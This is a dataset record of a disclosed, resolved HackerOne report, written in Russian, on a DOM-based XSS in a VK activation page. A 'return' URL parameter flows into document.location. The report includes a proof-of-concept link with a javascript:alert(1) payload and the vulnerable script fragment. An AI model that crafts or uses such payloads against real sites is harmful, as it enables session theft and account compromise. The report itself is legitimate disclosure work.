---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '146939'
original_report_id: '146939'
title: DOM XSS в /activation.php?act=activate_mobile
weakness: Cross-site Scripting (XSS) - Generic
team_handle: vkcom
created_at: '2016-06-24T04:12:59.876Z'
disclosed_at: '2016-09-22T21:11:41.578Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# DOM XSS в /activation.php?act=activate_mobile

## Metadata

- HackerOne Report ID: 146939
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: vkcom
- Disclosed At: 2016-09-22T21:11:41.578Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Поинтересовался тут функцией showOrderBox в API. Увидел там "Тестовое спецпредложение. Тестовое спецпредложение для разработчиков приложений."
При щелчке по кнопке "перейти в группу" попал на страницу /activation.php?act=activate_mobile&hash=мой_хэш&return=%2Foffersdesk%3Fact%3Dstart_offer%26offer_id%3D1237%26hash%3D17634e2103b0a99782%26test_mode%3D1%26aid%3D4846993%26app_currency%3D0%26from%3

Обратил внимание на параметр return. Увидел, что значение попадает в вывод страницы, предоставляя возможность осуществить xss атаку.

Сформировал следующую ссылку:
/activation.php?act=activate_mobile&hash=мой_хэш&return=javascript:alert(1);//offersdesk%3Fact%3Dstart_offer%26offer_id%3D1237%26hash%3D17634e2103b0a99782%26test_mode%3D1%26aid%3D4846993%26app_currency%3D0%26from%3

Получил alert при вводе в поле ввода правильного кода из смс.

Фрагмент уязвимого кода js: 
    params = {code: code, hash: 'a0096404730f329021'};
    callback = function(t) {
      if (t) {
        cur.phoneValidationMsg(t);
        return stop();
      }
      document.location = winToUtf('javascript:alert(1);//offersdesk?act=start_offer&amp;offer_id=1237&amp;hash=17634e2103b0a99782&amp;aid=4846993&amp;app_currency=0&amp;from=');
    }

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
